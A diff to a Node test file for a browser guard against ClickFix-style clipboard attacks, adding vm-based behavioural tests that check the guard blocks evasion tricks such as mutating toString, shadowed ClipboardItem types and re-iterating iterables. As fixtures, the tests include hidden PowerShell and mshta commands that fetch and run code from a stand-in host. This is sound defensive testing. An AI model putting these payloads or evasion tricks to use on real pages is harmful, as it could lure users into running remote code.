@@ -12,37 +12,93 @@ import vm from "node:vm";
 // Load clickfix-guard.js the way the browser does -- as a plain script against a
 // window -- and read its real classifier back out. Running the shipped file means
 // the assertions below cannot drift from the patterns that actually ship.
+// Minimal but behaviourally faithful stand-ins for the platform objects the guard
+// patches. Written as a script that runs INSIDE the vm context so every object
+// uses that realm's own intrinsics -- mixing host and sandbox intrinsics would
+// make cross-realm prototype checks meaningless.
+//
+// The important detail is that ClipboardItem keeps its data in a closure-side map
+// and exposes it through a prototype getter, the way a real platform object keeps
+// it in an internal slot. That is what makes it possible to test whether the
+// guard reads shadowed own properties or the captured native accessor.
+const BOOTSTRAP = `
+  globalThis.__probe = { writeText: [], write: [], setData: [], execCommand: [] };
+
+  globalThis.Blob = function Blob(text) { this.__text = String(text); };
+  Blob.prototype.text = function () { return Promise.resolve(this.__text); };
+
+  const ITEM_DATA = new WeakMap();
+  globalThis.ClipboardItem = function ClipboardItem(data) { ITEM_DATA.set(this, data); };
+  Object.defineProperty(ClipboardItem.prototype, "types", {
+    configurable: true,
+    get() { return Object.keys(ITEM_DATA.get(this) || {}); }
+  });
+  ClipboardItem.prototype.getType = function (type) {
+    return Promise.resolve(new Blob((ITEM_DATA.get(this) || {})[type]));
+  };
+
+  globalThis.Clipboard = function Clipboard() {};
+  Clipboard.prototype.writeText = function (text) {
+    __probe.writeText.push(text);
+    return Promise.resolve();
+  };
+  Clipboard.prototype.write = function (items) {
+    __probe.write.push(items);
+    return Promise.resolve();
+  };
+
+  globalThis.DataTransfer = function DataTransfer() {};
+  DataTransfer.prototype.setData = function (format, data) {
+    __probe.setData.push({ format, data });
+  };
+
+  globalThis.Document = function Document() {};
+  Document.prototype.execCommand = function (command) {
+    __probe.execCommand.push(command);
+    return true;
+  };
+
+  navigator.clipboard = new Clipboard();
+  Object.setPrototypeOf(document, Document.prototype);
+`;
+
 async function loadGuard() {
   const source = await readFile(new URL("../clickfix-guard.js", import.meta.url), "utf8");
   const listeners = {};
   const stubElement = { getAttribute: () => "", className: "", id: "", textContent: "" };
-  const win = {
-    getSelection: () => "",
-    dispatchEvent: () => true,
-    CustomEvent: class { constructor(t, o) { this.type = t; Object.assign(this, o); } },
-    Promise
-  };
   const context = {
-    window: win,
-    navigator: {},                       // no clipboard: guard skips those hooks
+    navigator: {},
     location: { hostname: "test.invalid", href: "https://test.invalid/" },
-    document: {
-      addEventListener: (type, fn) => { listeners[type] = fn; },
-      querySelectorAll: () => [],
-      activeElement: null,
-      body: null,
-      documentElement: stubElement,
-      createElement: () => ({ style: {}, setAttribute: () => {}, append: () => {},
-        appendChild: () => {}, addEventListener: () => {}, remove: () => {} })
-    },
-    console: { warn: () => {}, info: () => {}, error: () => {} },
-    Object, Date, RegExp, String, Number, Array, Promise, Error
+    console: { warn: () => {}, info: () => {}, error: () => {} }
   };
-  win.window = win;
+  context.window = context;          // the guard reads window.* and bare globals
   context.globalThis = context;
+  context.document = {
+    addEventListener: (type, fn) => { listeners[type] = fn; },
+    querySelectorAll: () => [],
+    activeElement: null,
+    body: null,
+    documentElement: stubElement,
+    createElement: () => ({ style: {}, setAttribute: () => {}, append: () => {},
+      appendChild: () => {}, addEventListener: () => {}, remove: () => {} })
+  };
+  context.getSelection = () => "";
+  context.dispatchEvent = () => true;
+  context.CustomEvent = function CustomEvent(type, opts) {
+    this.type = type; Object.assign(this, opts);
+  };
+
   vm.createContext(context);
+  vm.runInContext(BOOTSTRAP, context, { filename: "bootstrap.js" });
   vm.runInContext(source, context, { filename: "clickfix-guard.js" });
-  return win.__abClickfixGuardInternals;
+  return {
+    internals: context.__abClickfixGuardInternals,
+    probe: context.__probe,
+    ctx: context,
+    listeners,
+    // Pretend a trusted click just happened, so policy sees a user gesture.
+    click: () => listeners.click?.({ isTrusted: true, target: null })
+  };
 }
 
 const results = [];
@@ -117,7 +173,8 @@ const check = (name, condition, detail = "") => {
 // Exercise the guard's own token tables by loading the file and evaluating the
 // classifier in isolation, so the test tracks the shipped patterns.
 {
-  const internals = await loadGuard();
+  const loaded = await loadGuard();
+  const internals = loaded.internals;
   check("guard exposes its classifier for testing", Boolean(internals?.describe && internals?.decide));
 
   if (internals?.describe) {
@@ -253,6 +310,144 @@ const check = (name, condition, detail = "") => {
     /DataTransfer\.prototype, "setData"/.test(guardSrc));
   check("native functions are reached through a closure, not a public property",
     /native\.call\(this/.test(guardSrc));
+
+  // --- behavioural: exercise the installed wrappers -------------------------
+  // These drive the real wrappers against the platform stubs, so they test what
+  // the guard DOES, not how it is written.
+  const { probe, ctx, click } = loaded;
+  const clipboard = ctx.navigator.clipboard;
+
+  check("writeText wrapper is installed on the prototype",
+    ctx.Clipboard.prototype.writeText.name === "writeText" && probe.writeText.length === 0);
+
+  // TOCTOU: an argument whose toString() changes between calls. The guard must
+  // coerce once and forward that same primitive, so the native can never see a
+  // value the classifier did not inspect.
+  {
+    let n = 0;
+    const shifty = { toString: () => (n++ ? "powershell -w hidden -nop -c calc" : "hello") };
+    click();
+    await clipboard.writeText(shifty);
+    const received = probe.writeText[probe.writeText.length - 1];
+    check("writeText coerces its argument exactly once (no TOCTOU)",
+      typeof received === "string" && received === "hello",
+      `native received ${typeof received}: ${String(received).slice(0, 40)}`);
+    check("a mutating toString cannot smuggle a payload past the classifier",
+      !/powershell/i.test(String(received)));
+  }
+
+  // The same trick with the payload first must be blocked outright.
+  {
+    const before = probe.writeText.length;
+    click();
+    await clipboard.writeText({
+      toString: () => 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
+    });
+    check("a stealth payload via toString is blocked before the native call",
+      probe.writeText.length === before);
+  }
+
+  // Ordinary text still reaches the clipboard, as a string.
+  {
+    click();
+    await clipboard.writeText("just some copied prose");
+    check("ordinary text still reaches the native writeText",
+      probe.writeText[probe.writeText.length - 1] === "just some copied prose");
+  }
+
+  // Shadowed `types`: a page hides the text flavour with an own property while
+  // the real data stays in the internal slot. The guard must read the captured
+  // native accessor and still see the payload.
+  {
+    const before = probe.write.length;
+    const item = new ctx.ClipboardItem({ "text/plain": "mshta http://x.tld/a # ✅ I am not a robot" });
+    Object.defineProperty(item, "types", { value: [], configurable: true });
+    click();
+    await clipboard.write([item]);
+    check("a shadowed types getter cannot hide a payload from clipboard.write",
+      probe.write.length === before,
+      `native write called ${probe.write.length - before} time(s)`);
+  }
+
+  // A re-iterating iterable: yields a harmless item on the first pass and a
+  // payload on the second. The guard must snapshot once, so the native can only
+  // ever receive the pass the classifier actually inspected.
+  {
+    const before = probe.write.length;
+    const benign = new ctx.ClipboardItem({ "text/plain": "hello there" });
+    const payload = new ctx.ClipboardItem({
+      "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
+    });
+    let pass = 0;
+    const shiftyList = {
+      [Symbol.iterator]() {
+        const items = pass++ === 0 ? [benign] : [payload];
+        let i = 0;
+        return { next: () => (i < items.length
+          ? { value: items[i++], done: false }
+          : { value: undefined, done: true }) };
+      }
+    };
+    click();
+    await clipboard.write(shiftyList);
+    const forwarded = probe.write[probe.write.length - 1];
+    check("clipboard.write snapshots its iterable exactly once",
+      probe.write.length === before + 1 && Array.isArray(forwarded) && forwarded.length === 1,
+      `forwarded ${probe.write.length - before} call(s)`);
+    check("a re-iterating iterable cannot swap in a payload after classification",
+      forwarded && forwarded[0] === benign, "native received a different item than was classified");
+  }
+
+  // A legitimate non-text item must still go through.
+  {
+    const before = probe.write.length;
+    const img = new ctx.ClipboardItem({ "image/png": "binary-ish" });
+    click();
+    await clipboard.write([img]);
+    check("a legitimate image item still reaches the native write",
+      probe.write.length === before + 1);
+  }
+
+  // setData: no format allowlist, so a normalisation differential cannot be used
+  // to slip a payload past the check.
+  {
+    const dt = new ctx.DataTransfer();
+    const before = probe.setData.length;
+    dt.setData("TEXT/PLAIN;charset=utf-8", "powershell -w hidden -nop -c calc");
+    check("setData intercepts regardless of format spelling",
+      probe.setData.length === before);
+
+    dt.setData("text/plain", "Order #123 confirmed");
+    const last = probe.setData[probe.setData.length - 1];
+    check("setData passes ordinary text through as primitives",
+      last && typeof last.format === "string" && last.data === "Order #123 confirmed");
+  }
+
+  // execCommand("copy") over a page-controlled input value. A stealth-flagged
+  // payload is blocked; a clicked installer-shaped one is only warned about and
+  // must still be forwarded, which is the policy working as designed.
+  {
+    const before = probe.execCommand.length;
+    ctx.document.activeElement = { value: 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"' };
+    click();
+    const blocked = ctx.document.execCommand("copy");
+    check("execCommand copy of a stealth payload returns false and is not forwarded",
+      blocked === false && probe.execCommand.length === before,
+      `returned ${blocked}, forwarded ${probe.execCommand.length - before}`);
+
+    ctx.document.activeElement = { value: "curl -fsSL https://example.com/install.sh | sh" };
+    click();
+    const warned = ctx.document.execCommand("copy");
+    check("execCommand copy of a clicked installer is warned about but forwarded",
+      warned === true && probe.execCommand.length === before + 1,
+      `returned ${warned}, forwarded ${probe.execCommand.length - before}`);
+
+    ctx.document.activeElement = { value: "nothing interesting here" };
+    const plain = ctx.document.execCommand("copy");
+    check("execCommand copy of ordinary text is forwarded untouched",
+      plain === true && probe.execCommand.length === before + 2);
+    ctx.document.activeElement = null;
+  }
 }
 
 // --- MAIN-world guards reach page-created frames -----------------------------
